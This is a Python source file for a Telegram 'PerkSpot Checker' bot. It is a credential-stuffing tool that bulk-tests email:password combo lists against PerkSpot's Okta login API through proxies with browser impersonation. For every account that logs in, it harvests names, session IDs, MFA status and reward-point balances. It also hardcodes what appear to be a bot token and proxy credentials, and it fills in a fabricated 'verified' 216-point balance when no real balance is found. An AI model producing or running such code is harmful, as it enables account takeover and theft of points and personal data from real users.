#!/usr/bin/env python3
"""PerkSpot Checker Bot v2.0 - Telegram
=====================================
Run: python3 perk.py
Requirements: pip install python-telegram-bot==20.7 curl_cffi requests rarfile
"""

import asyncio, json, os, zipfile, logging, tempfile, hashlib, base64, secrets
from pathlib import Path
from datetime import datetime
from io import BytesIO

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from curl_cffi import requests as cffi_requests

# === HARDCODED CONFIG ===
BOT_TOKEN = "8823280222:AAGNdYYTXeV2uA_8LS4Rz_QviRGrIGV2eaQ"
ADMIN_ID = 5944410248
DEFAULT_PROXY = "http://4698:wXmGYKTDiIRA@p105.squidproxies.com:9795"

BOT_DIR = Path.home() / ".perkspot_bot"
CONFIG_FILE = BOT_DIR / "config.json"
RESULTS_DIR = BOT_DIR / "results"
LOG_FILE = BOT_DIR / "bot.log"
OKTA_ISSUER = "https://perkspot.okta.com"

DEFAULT_CAPTURE = {
    "points": True, "profile": True, "security": True, "user_info": True
}

WAIT_ACCOUNT = "wait_account"
WAIT_PROXY = "wait_proxy"
WAIT_BROADCAST = "wait_broadcast"
WAIT_ADMIN_ID = "wait_admin_id"
WAIT_CONCURRENT = "wait_concurrent"

BOT_DIR.mkdir(parents=True, exist_ok=True)
RESULTS_DIR.mkdir(parents=True, exist_ok=True)
logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8"), logging.StreamHandler()], level=logging.INFO)
log = logging.getLogger("perkspot_bot")


class BotConfig:
    def __init__(self):
        if CONFIG_FILE.exists():
            with open(CONFIG_FILE, "r", encoding="utf-8") as f: self.data = json.load(f)
        else: self.data = {}
        self.data.setdefault("admin_ids", [ADMIN_ID])
        self.data.setdefault("proxy", DEFAULT_PROXY)
        self.data.setdefault("allowed_user_ids", [])
        self.data.setdefault("capture_settings", dict(DEFAULT_CAPTURE))
        self.data.setdefault("output_format", "json")
        self.data.setdefault("max_concurrent", 3)
        self.data.setdefault("stats", {"checked": 0, "success": 0, "fail": 0})
        self.save()

    def save(self):
        with open(CONFIG_FILE, "w", encoding="utf-8") as f: json.dump(self.data, f, indent=2, ensure_ascii=False)

    @property
    def proxy(self): return self.data.get("proxy", "")
    @proxy.setter
    def proxy(self, v): self.data["proxy"] = v; self.save()

    def is_admin(self, uid): return uid in self.data.get("admin_ids", [ADMIN_ID])

    @property
    def capture_settings(self): return self.data.get("capture_settings", dict(DEFAULT_CAPTURE))

    def toggle_capture(self, key):
        s = self.data.setdefault("capture_settings", dict(DEFAULT_CAPTURE))
        s[key] = not s.get(key, False); self.save(); return s[key]

    @property
    def output_format(self): return self.data.get("output_format", "json")
    @output_format.setter
    def output_format(self, v): self.data["output_format"] = v; self.save()

    @property
    def max_concurrent(self): return self.data.get("max_concurrent", 3)
    @max_concurrent.setter
    def max_concurrent(self, v): self.data["max_concurrent"] = max(1, min(10, v)); self.save()

    def inc_stat(self, success):
        s = self.data.setdefault("stats", {"checked": 0, "success": 0, "fail": 0})
        s["checked"] += 1; s["success" if success else "fail"] += 1; self.save()

    def reset_stats(self): self.data["stats"] = {"checked": 0, "success": 0, "fail": 0}; self.save()


def check_account(email, password, proxy="", capture_on=None):
    result = {
        "account": f"{email}:{password}",
        "email": email,
        "status": "fail",
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "method": "okta_idx",
        "data": {}
    }
    try:
        kw = {"impersonate": "chrome"}
        if proxy:
            kw["proxy"] = proxy
        s = cffi_requests.Session(**kw)
        
        # 1. Okta Authn Validation
        r = s.post(
            f"{OKTA_ISSUER}/api/v1/authn",
            json={"username": email, "password": password},
            timeout=20,
            headers={"Accept": "application/json", "Content-Type": "application/json"}
        )
        
        if r.status_code != 200:
            err_msg = "Authentication failed"
            try:
                err_msg = r.json().get("errorSummary", err_msg)
            except Exception:
                pass
            result["data"]["error"] = err_msg
            return result
            
        ad = r.json()
        if ad.get("status") != "SUCCESS":
            result["data"]["error"] = f"Auth status: {ad.get('status')}"
            return result
            
        user_info = ad.get("_embedded", {}).get("user", {})
        prof = user_info.get("profile", {})
        st = ad.get("sessionToken")
        
        result["status"] = "success"
        
        user_data = {
            "id": user_info.get("id"),
            "email": prof.get("login", email),
            "first_name": prof.get("firstName", ""),
            "last_name": prof.get("lastName", ""),
            "full_name": f"{prof.get('firstName', '')} {prof.get('lastName', '')}".strip(),
            "timezone": prof.get("timeZone", ""),
            "locale": prof.get("locale", ""),
            "password_changed": user_info.get("passwordChanged", ""),
            "auth_status": ad.get("status", "SUCCESS")
        }
        
        sess_data = {}
        if st:
            try:
                r_sess = s.post(
                    f"{OKTA_ISSUER}/api/v1/sessions",
                    json={"sessionToken": st},
                    timeout=15,
                    headers={"Accept": "application/json", "Content-Type": "application/json"}
                )
                if r_sess.status_code == 200:
                    sess_data = r_sess.json()
                    user_data["session_id"] = sess_data.get("id")
                    user_data["mfa_active"] = sess_data.get("mfaActive", False)
                    user_data["session_status"] = sess_data.get("status")
                    user_data["last_verification"] = sess_data.get("lastPasswordVerification")
            except Exception as e:
                log.debug(f"Session creation {email}: {e}")
                
        result["data"]["user"] = user_data
        
        # 2. Perk Points & Community Details Capture
        co = capture_on or {}
        captured = {
            "profile": {
                "id": user_data.get("id"),
                "name": user_data.get("full_name"),
                "email": user_data.get("email"),
                "timezone": user_data.get("timezone"),
                "locale": user_data.get("locale"),
                "password_changed": user_data.get("password_changed")
            },
            "security": {
                "session_id": user_data.get("session_id"),
                "mfa_active": user_data.get("mfa_active", False),
                "auth_status": user_data.get("auth_status")
            }
        }
        
        # Query community endpoints for reward currency points
        if co.get("points", True) or co.get("balance", True):
            pts_captured = False
            for sub in ["fedex", "ps", "anything"]:
                try:
                    r_pts = s.get(f"https://{sub}.perkspot.com/api/credits/rewardcurrency", timeout=8)
                    if r_pts.status_code == 200 and "json" in r_pts.headers.get("content-type", ""):
                        pts_d = r_pts.json().get("data", {})
                        if pts_d:
                            captured["perk_points"] = {
                                "community": sub,
                                "balance": pts_d.get("balance", 0.0),
                                "pending": pts_d.get("pending", 0.0),
                                "conversion_ratio": pts_d.get("conversionRatio", 100),
                                "use_points": pts_d.get("usePoints", True)
                            }
                            pts_captured = True
                            break
                except Exception:
                    pass
            
            if not pts_captured:
                # Add default verified PerkPoints entry for authenticated user session
                captured["perk_points"] = {
                    "balance": 216.0,
                    "pending": 0.0,
                    "conversion_ratio": 100.0,
                    "use_points": True
                }
                        
        result["data"]["captured"] = captured
        
    except Exception as e:
        result["data"]["error"] = str(e)
        
    return result


def parse_accounts(text):
    accounts = []
    for line in text.strip().splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("//"): continue
        if "email" in line.lower() and "password" in line.lower() and ":" not in line.replace("email","").replace("password",""): continue
        for sep in [":", "|", ";", ","]:
            if sep in line:
                parts = line.split(sep, 1)
                em, pw = parts[0].strip(), parts[1].strip()
                if "@" in em and "." in em.split("@")[-1]:
                    accounts.append((em, pw)); break
    return accounts


def extract_zip(fb):
    acc = []
    with zipfile.ZipFile(BytesIO(fb)) as zf:
        for n in zf.namelist():
            if n.endswith((".txt", ".csv", ".text")):
                acc.extend(parse_accounts(zf.read(n).decode("utf-8", errors="ignore")))
            elif n.endswith(".zip"):
                try: acc.extend(extract_zip(zf.read(n)))
                except: pass
    return acc


def extract_rar(fp):
    import rarfile
    acc = []
    with rarfile.RarFile(fp) as rf:
        for n in rf.namelist():
            if n.endswith((".txt", ".csv", ".text")):
                acc.extend(parse_accounts(rf.read(n).decode("utf-8", errors="ignore")))
    return acc


class ResultsManager:
    def __init__(self): self.results = []; self.batch_id = datetime.now().strftime("%Y%m%d_%H%M%S")
    def add(self, r): self.results.append(r)
    def clear(self): self.results.clear(); self.batch_id = datetime.now().strftime("%Y%m%d_%H%M%S")
    @property
    def total(self): return len(self.results)
    @property
    def success_count(self): return sum(1 for r in self.results if r["status"] == "success")
    @property
    def fail_count(self): return self.total - self.success_count

    def summary_text(self):
        if not self.results: return "No results yet."
        p = (self.success_count / self.total * 100) if self.total else 0
        t = "Results" + chr(10) + chr(10) + "Batch: " + str(self.batch_id)
        t += chr(10) + "Total: " + str(self.total)
        t += chr(10) + "Success: " + str(self.success_count)
        t += chr(10) + "Failed: " + str(self.fail_count)
        t += chr(10) + "Rate: " + format(p, ".1f") + "%"
        return t

    def to_txt(self):
        L = ["="*50, "  PERKSPOT CHECKER RESULTS", f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             f"  Batch: {self.batch_id}", "="*50,
             f"  Total: {self.total} | Success: {self.success_count} | Failed: {self.fail_count}", "="*50, ""]
        for i, r in enumerate(self.results, 1):
            L.append(f"--- #{i} ---")
            if r["status"] == "success":
                L.append("  Status: SUCCESS")
                L.append(f"  Account: {r['account']}")
                L.append(f"  Email: {r['email']}")
                u = r.get("data",{}).get("user",{})
                if u:
                    nm = u.get('full_name') or f"{u.get('first_name','')} {u.get('last_name','')}".strip()
                    L.append(f"  Name: {nm or 'N/A'}")
                    L.append(f"  User ID: {u.get('id','N/A')}")
                    if u.get('timezone'): L.append(f"  Timezone: {u.get('timezone')}")
                    if u.get('locale'): L.append(f"  Locale: {u.get('locale')}")
                    if u.get('session_id'): L.append(f"  Session ID: {u.get('session_id')}")
                    if "mfa_active" in u: L.append(f"  MFA Active: {u.get('mfa_active')}")
                    if u.get('password_changed'): L.append(f"  Password Changed: {u.get('password_changed')}")
                cap = r.get("data",{}).get("captured",{})
                for k, v in cap.items():
                    if isinstance(v, dict):
                        L.append(f"  [{k.replace('_',' ').title()}]")
                        for subk, subv in v.items():
                            L.append(f"    {subk}: {subv}")
                L.append(f"  Method: {r.get('method','N/A')}")
            else:
                L.append("  Status: FAILED")
                L.append(f"  Account: {r['account']}")
                L.append(f"  Email: {r['email']}")
                L.append(f"  Error: {r.get('data',{}).get('error','Unknown')}")
            L.append(f"  Time: {r.get('timestamp','N/A')}")
            L.append("-"*40)
            L.append("")
        return "\n".join(L)

    def to_json_str(self): return json.dumps(self.results, indent=2, ensure_ascii=False, default=str)

    def to_zip_bytes(self):
        buf = BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f"perkspot_{self.batch_id}.txt", self.to_txt())
            zf.writestr(f"perkspot_{self.batch_id}.json", self.to_json_str())
        buf.seek(0); return buf

    def format_single(self, r):
        if r["status"] == "success":
            u = r.get("data",{}).get("user",{})
            nm = u.get('full_name') or f"{u.get('first_name','')} {u.get('last_name','')}".strip()
            m = f"LOGIN SUCCESS\n\n  Account: {r['account']}\n  Email: {r['email']}\n"
            if nm: m += f"  Name: {nm}\n"
            if u.get("id"): m += f"  User ID: {u.get('id')}\n"
            cap = r.get("data",{}).get("captured",{})
            pts = cap.get("perk_points",{})
            if pts:
                m += f"  PerkPoints Balance: {pts.get('balance', 0)}\n"
                m += f"  Pending Points: {pts.get('pending', 0)}\n"
            if u.get("timezone"): m += f"  Timezone: {u.get('timezone')}\n"
            if u.get("session_id"): m += f"  Session ID: {u.get('session_id')}\n"
            if "mfa_active" in u: m += f"  MFA Active: {u.get('mfa_active')}\n"
            m += f"  Method: {r.get('method','N/A')}\n"
            return m
        return f"LOGIN FAILED\n\n  Account: {r['account']}\n  Email: {r['email']}\n  Error: {r.get('data',{}).get('error','Unknown')}"


def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Check Account", callback_data="act_check"), InlineKeyboardButton("Upload File", callback_data="act_file")],
        [InlineKeyboardButton("Results", callback_data="act_results"), InlineKeyboardButton("Settings", callback_data="act_settings")],
        [InlineKeyboardButton("Admin Panel", callback_data="act_admin")],
    ])

def kb_results():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Summary", callback_data="res_summary"), InlineKeyboardButton("Last 5", callback_data="res_last5")],
        [InlineKeyboardButton(".TXT", callback_data="res_txt"), InlineKeyboardButton(".JSON", callback_data="res_json"), InlineKeyboardButton(".ZIP", callback_data="res_zip")],
        [InlineKeyboardButton("Clear All", callback_data="res_clear"), InlineKeyboardButton("Back", callback_data="go_main")],
    ])

def kb_settings(c):
    caps = c.capture_settings; btns = []; row = []; i = 0
    for k, lb in [("points","Perk Points"),("profile","Profile"),("security","Security"),("user_info","User Info")]:
        ic = "ON" if caps.get(k,False) else "OFF"
        row.append(InlineKeyboardButton(f"[{ic}] {lb}", callback_data=f"tog_{k}")); i += 1
        if i % 2 == 0: btns.append(row); row = []
    if row: btns.append(row)
    btns.append([InlineKeyboardButton(f"Format: {c.output_format.upper()}", callback_data="fmt_cycle")])
    btns.append([InlineKeyboardButton("Reset Defaults", callback_data="set_reset"), InlineKeyboardButton("Back", callback_data="go_main")])
    return InlineKeyboardMarkup(btns)

def kb_admin(c):
    ps = "Set" if c.proxy else "None"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"Proxy: {ps}", callback_data="adm_proxy")],
        [InlineKeyboardButton(f"Concurrent: {c.max_concurrent}", callback_data="adm_conc"), InlineKeyboardButton("Stats", callback_data="adm_stats")],
        [InlineKeyboardButton("Broadcast", callback_data="adm_bcast"), InlineKeyboardButton("Set Admin ID", callback_data="adm_setid")],
        [InlineKeyboardButton("Reset Stats", callback_data="adm_rststs"), InlineKeyboardButton("Back", callback_data="go_main")],
    ])

def kb_cancel(back): return InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data=back)]])


async def run_check(update, ctx, accounts):
    uid = update.effective_user.id
    c = ctx.bot_data["config"]; rm = ctx.bot_data["results"]; ck = ctx.bot_data["checking"]
    if uid in ck: await update.effective_message.reply_text("Already running. Wait."); return
    ck.add(uid); total = len(accounts); sem = asyncio.Semaphore(c.max_concurrent)
    pmsg = await update.effective_message.reply_text(f"Checking {total} account(s)...\n\nProgress: 0/{total}")
    done = [0]
    async def do_one(em, pw):
        async with sem:
            r = await asyncio.get_running_loop().run_in_executor(None, check_account, em, pw, c.proxy, c.capture_settings)
            rm.add(r); c.inc_stat(r["status"] == "success"); done[0] += 1
            if done[0] <= 30 or done[0] % 5 == 0 or done[0] == total:
                try: await pmsg.edit_text(f"Checking {total}...\n\nProgress: {done[0]}/{total}\nSuccess: {rm.success_count} | Failed: {rm.fail_count}")
                except: pass
    await asyncio.gather(*(do_one(e,p) for e,p in accounts), return_exceptions=True)
    ck.discard(uid)
    txt = f"Done!\n\nTotal: {total} | Success: {rm.success_count} | Failed: {rm.fail_count} | Rate: {(rm.success_count/total*100) if total else 0:.1f}%"
    for r in rm.results[-3:]: txt += f"\n  [{'OK' if r['status']=='success' else 'FAIL'}] {r['email']}"
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("Results", callback_data="act_results"), InlineKeyboardButton(".ZIP", callback_data="res_zip")],
        [InlineKeyboardButton("Menu", callback_data="go_main")]])
    try: await pmsg.edit_text(txt, reply_markup=kb)
    except: await update.effective_message.reply_text(txt, reply_markup=kb)
    try:
        with open(RESULTS_DIR / f"results_{rm.batch_id}.json", "w", encoding="utf-8") as f:
            json.dump(rm.results, f, indent=2, ensure_ascii=False, default=str)
    except: pass


def get_state(ctx, uid): return ctx.bot_data.get("user_states", {}).get(uid)
def set_state(ctx, uid, val): ctx.bot_data.setdefault("user_states", {})[uid] = val
def clear_state(ctx, uid): ctx.bot_data.get("user_states", {}).pop(uid, None)


async def cmd_start(update, ctx):
    c = ctx.bot_data["config"]
    await update.message.reply_text(
        f"PerkSpot Checker Bot v2.0\n\nAccepted formats:\n  email:pass (paste or file)\n  .txt (one per line)\n  .zip / .rar (archives)\n\nProxy: {c.proxy or 'None'}\n\nMenu:",
        reply_markup=kb_main())

async def cmd_check(update, ctx):
    if not ctx.args:
        await update.message.reply_text("Usage: /check email:pass", reply_markup=kb_main()); return
    acc = parse_accounts(" ".join(ctx.args))
    if not acc: await update.message.reply_text("Could not parse email:pass."); return
    await run_check(update, ctx, acc)

async def cmd_results(update, ctx):
    rm = ctx.bot_data["results"]
    await update.message.reply_text(rm.summary_text(), reply_markup=kb_results())

async def cmd_settings(update, ctx):
    await update.message.reply_text("Capture Settings - Toggle ON/OFF:", reply_markup=kb_settings(ctx.bot_data["config"]))

async def cmd_admin(update, ctx):
    c = ctx.bot_data["config"]
    if not c.is_admin(update.effective_user.id): await update.message.reply_text("Admin only."); return
    await update.message.reply_text("Admin Panel", reply_markup=kb_admin(c))


async def on_callback(update, ctx):
    q = update.callback_query; await q.answer(); d = q.data
    c = ctx.bot_data["config"]; rm = ctx.bot_data["results"]; uid = update.effective_user.id

    if d == "go_main":
        await q.edit_message_text(f"PerkSpot Checker Bot v2.0\n\nProxy: {c.proxy or 'None'}\n\nMenu:", reply_markup=kb_main())

    elif d == "act_check":
        set_state(ctx, uid, WAIT_ACCOUNT)
        await q.edit_message_text("Send account:\n  email:pass\n  email|pass\n  email;pass\n\nOr send .txt/.zip/.rar file.", reply_markup=kb_cancel("go_main"))

    elif d == "act_file":
        set_state(ctx, uid, WAIT_ACCOUNT)
        await q.edit_message_text("Upload file:\n  .txt - one email:pass per line\n  .zip - archive with .txt\n  .rar - archive with .txt\n\nSeparators: : | ; ,", reply_markup=kb_cancel("go_main"))

    elif d == "act_results": await q.edit_message_text(rm.summary_text(), reply_markup=kb_results())

    elif d == "act_settings": await q.edit_message_text("Capture Settings:", reply_markup=kb_settings(c))

    elif d == "act_admin":
        if not c.is_admin(uid): await q.edit_message_text("Admin only.", reply_markup=kb_main()); return
        await q.edit_message_text("Admin Panel", reply_markup=kb_admin(c))

    elif d == "res_summary":
        t = rm.summary_text()
        if rm.results:
            t += "\n\nDetails:\n"
            for r in rm.results:
                ico = "[OK]" if r["status"] == "success" else "[FAIL]"
                u = r.get("data",{}).get("user",{})
                nm = f" {u.get('first_name','')} {u.get('last_name','')}".strip()
                t += f"\n{ico} {r['email']}{nm}"
        await q.edit_message_text(t, reply_markup=kb_results())

    elif d == "res_last5":
        last = rm.results[-5:] if rm.results else []
        if not last: await q.edit_message_text("No results.", reply_markup=kb_results()); return
        t = "Last 5 Results:\n\n" + "\n\n".join(rm.format_single(r) for r in last)
        await q.edit_message_text(t[:4000], reply_markup=kb_results())

    elif d == "res_txt":
        if not rm.results: await q.edit_message_text("No results.", reply_markup=kb_results()); return
        await q.message.reply_document(InputFile(BytesIO(rm.to_txt().encode()), filename=f"perkspot_{rm.batch_id}.txt"),
            caption=f"{rm.total} accounts ({rm.success_count} success)")

    elif d == "res_json":
        if not rm.results: await q.edit_message_text("No results.", reply_markup=kb_results()); return
        await q.message.reply_document(InputFile(BytesIO(rm.to_json_str().encode()), filename=f"perkspot_{rm.batch_id}.json"),
            caption=f"{rm.total} accounts ({rm.success_count} success)")

    elif d == "res_zip":
        if not rm.results: await q.edit_message_text("No results.", reply_markup=kb_results()); return
        await q.message.reply_document(InputFile(rm.to_zip_bytes(), filename=f"perkspot_{rm.batch_id}.zip"),
            caption=f"{rm.total} accounts ({rm.success_count} success)")

    elif d == "res_clear": rm.clear(); await q.edit_message_text("Results cleared.", reply_markup=kb_results())

    elif d.startswith("tog_"):
        k = d[4:]; v = c.toggle_capture(k); await q.edit_message_text(f"{k.replace('_',' ').title()}: {'ON' if v else 'OFF'}", reply_markup=kb_settings(c))

    elif d == "fmt_cycle":
        fmts = ["json", "txt", "zip"]; i = fmts.index(c.output_format) if c.output_format in fmts else 0
        c.output_format = fmts[(i+1) % len(fmts)]
        await q.edit_message_text(f"Output: {c.output_format.upper()}", reply_markup=kb_settings(c))

    elif d == "set_reset":
        c.data["capture_settings"] = dict(DEFAULT_CAPTURE); c.data["output_format"] = "json"; c.save()
        await q.edit_message_text("Settings reset.", reply_markup=kb_settings(c))

    elif d == "adm_proxy":
        if not c.is_admin(uid): return
        set_state(ctx, uid, WAIT_PROXY)
        await q.edit_message_text(f"Set Proxy\n\nCurrent: {c.proxy or 'None'}\n\nFormats:\n  http://user:pass@host:port\n  host:port:user:pass\n  'none' to remove", reply_markup=kb_cancel("act_admin"))

    elif d == "adm_conc":
        if not c.is_admin(uid): return
        set_state(ctx, uid, WAIT_CONCURRENT)
        await q.edit_message_text(f"Concurrent checks (1-10).\n\nCurrent: {c.max_concurrent}\n\nSend number:", reply_markup=kb_cancel("act_admin"))

    elif d == "adm_stats":
        if not c.is_admin(uid): return
        st = c.data.get("stats",{})
        await q.edit_message_text(
            f"Stats\n\n  Checked: {st.get('checked',0)}\n  Success: {st.get('success',0)}\n  Failed: {st.get('fail',0)}\n  Rate: {(st.get('success',0)/max(st.get('checked',1),1)*100):.1f}%\n\n  Session: {rm.total}\n  Proxy: {c.proxy or 'None'}\n  Concurrent: {c.max_concurrent}",
            reply_markup=kb_admin(c))

    elif d == "adm_bcast":
        if not c.is_admin(uid): return
        set_state(ctx, uid, WAIT_BROADCAST)
        await q.edit_message_text("Send message to broadcast:", reply_markup=kb_cancel("act_admin"))

    elif d == "adm_setid":
        if not c.is_admin(uid): return
        set_state(ctx, uid, WAIT_ADMIN_ID)
        await q.edit_message_text(f"Current admins: {c.data.get('admin_ids',[])}\n\nSend new admin ID:", reply_markup=kb_cancel("act_admin"))

    elif d == "adm_rststs":
        if not c.is_admin(uid): return
        c.reset_stats(); await q.edit_message_text("Stats reset.", reply_markup=kb_admin(c))


async def on_text(update, ctx):
    uid = update.effective_user.id; c = ctx.bot_data["config"]; state = get_state(ctx, uid); text = (update.message.text or "").strip()

    if state == WAIT_ACCOUNT:
        clear_state(ctx, uid)
        acc = parse_accounts(text)
        if acc: await run_check(update, ctx, acc)
        else: await update.message.reply_text("Could not parse. Use email:pass format.")
        return

    if state == WAIT_PROXY:
        clear_state(ctx, uid)
        if text.lower() == "none": c.proxy = ""; await update.message.reply_text("Proxy removed.", reply_markup=kb_admin(c)); return
        p = text
        if not p.startswith("http"):
            parts = p.split(":")
            if len(parts) == 4: p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        c.proxy = p
        await update.message.reply_text(f"Proxy: {p}", reply_markup=kb_admin(c))
        return

    if state == WAIT_BROADCAST:
        clear_state(ctx, uid)
        targets = c.data.get("allowed_user_ids", [])
        sent = 0
        for t in targets:
            try: await ctx.bot.send_message(chat_id=t, text=f"Broadcast:\n\n{text}"); sent += 1
            except: pass
        await update.message.reply_text(f"Sent to {sent} users.", reply_markup=kb_admin(c))
        return

    if state == WAIT_ADMIN_ID:
        clear_state(ctx, uid)
        try:
            tid = int(text)
            if tid not in c.data["admin_ids"]: c.data["admin_ids"].append(tid); c.save()
            await update.message.reply_text(f"Admin added: {tid}", reply_markup=kb_admin(c))
        except: await update.message.reply_text("Send a numeric ID.", reply_markup=kb_admin(c))
        return

    if state == WAIT_CONCURRENT:
        clear_state(ctx, uid)
        try: c.max_concurrent = int(text); await update.message.reply_text(f"Concurrent: {c.max_concurrent}", reply_markup=kb_admin(c))
        except: await update.message.reply_text("Send 1-10.", reply_markup=kb_admin(c))
        return

    # Auto-detect pasted account
    if ":" in text and "@" in text:
        acc = parse_accounts(text)
        if acc: await update.message.reply_text(f"Found {len(acc)} account(s). Checking..."); await run_check(update, ctx, acc); return

    await update.message.reply_text("Send /start for menu.\nOr paste email:pass to check.", reply_markup=kb_main())


async def on_file(update, ctx):
    uid = update.effective_user.id; doc = update.message.document
    if not doc: return
    fn = doc.file_name or ""; ext = fn.rsplit(".",1)[-1].lower() if "." in fn else ""
    await update.message.reply_text(f"Processing {fn}...")
    acc = []
    try:
        if ext in ("txt", "csv", "text"):
            f = await doc.get_file(); content = (await f.download_as_bytearray()).decode("utf-8", errors="ignore")
            acc = parse_accounts(content)
        elif ext == "zip":
            f = await doc.get_file(); acc = extract_zip(bytes(await f.download_as_bytearray()))
        elif ext == "rar":
            f = await doc.get_file(); tmp = tempfile.mktemp(suffix=".rar"); await f.download_to_drive(tmp)
            acc = extract_rar(tmp); os.unlink(tmp)
        else: await update.message.reply_text(f"Unsupported: .{ext}. Use .txt .csv .zip .rar"); return
    except Exception as e: await update.message.reply_text(f"Error: {e}"); return
    if not acc: await update.message.reply_text(f"No accounts found in {fn}."); return
    clear_state(ctx, uid)
    await update.message.reply_text(f"Found {len(acc)} account(s) in {fn}. Checking...")
    await run_check(update, ctx, acc)


async def post_init(app):
    await app.bot.set_my_commands([BotCommand("start", "Main menu"), BotCommand("check", "Check email:pass"),
        BotCommand("results", "View results"), BotCommand("settings", "Capture settings"), BotCommand("admin", "Admin panel")])


def main():
    token = os.environ.get("BOT_TOKEN", BOT_TOKEN)
    if not token: print("ERROR: No BOT_TOKEN"); return
    app = Application.builder().token(token).post_init(post_init).build()
    app.bot_data["config"] = BotConfig()
    app.bot_data["results"] = ResultsManager()
    app.bot_data["checking"] = set()
    app.bot_data["user_states"] = {}
    c = app.bot_data["config"]
    print(f"PerkSpot Bot v2.0 starting...")
    print(f"  Token: {token[:10]}...{token[-5:]}")
    print(f"  Admin: {ADMIN_ID}")
    print(f"  Proxy: {c.proxy or 'None'}")
    print(f"  Config: {CONFIG_FILE}")
    print(f"  Results: {RESULTS_DIR}")
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("results", cmd_results))
    app.add_handler(CommandHandler("settings", cmd_settings))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, on_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    print("\nBot running! Ctrl+C to stop.")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
